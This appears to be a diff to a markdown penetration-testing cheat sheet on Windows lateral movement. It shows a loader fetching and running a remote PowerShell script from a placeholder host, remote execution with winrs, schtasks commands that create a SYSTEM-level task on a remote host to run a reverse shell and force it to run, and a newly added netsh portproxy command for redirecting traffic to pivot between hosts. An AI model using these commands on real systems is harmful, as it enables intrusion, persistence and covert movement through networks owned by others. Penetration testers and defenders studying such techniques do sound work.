@@ -97,7 +97,9 @@ C:> winrs.exe -r:COMPUTER cmd
 ```powershell
 C:> Loader.exe -path http://<ip>/<file>.ps1
 ```
-### Task Scheduling
+### CMD Intersting Commands
+---
+##### Task Scheduling
 ---
 ```powershell
 # Create task to run a reverse shell
@@ -105,6 +107,11 @@ C:> schtasks /create /S <host> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<task_n
 
 # Force task to run
 C:> schtasks /Run /S <host_fqdn> /TN "<task_name>"
+```
+##### Port Redirection
+```powershell
+# Redirect connection to local ip and port to remote ip andp ort
+C:> netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_IP> connectport=<remote_port> connectaddress=<remote_IP>"
 ```
 ### File Copy Using Powershell
 ```powershell
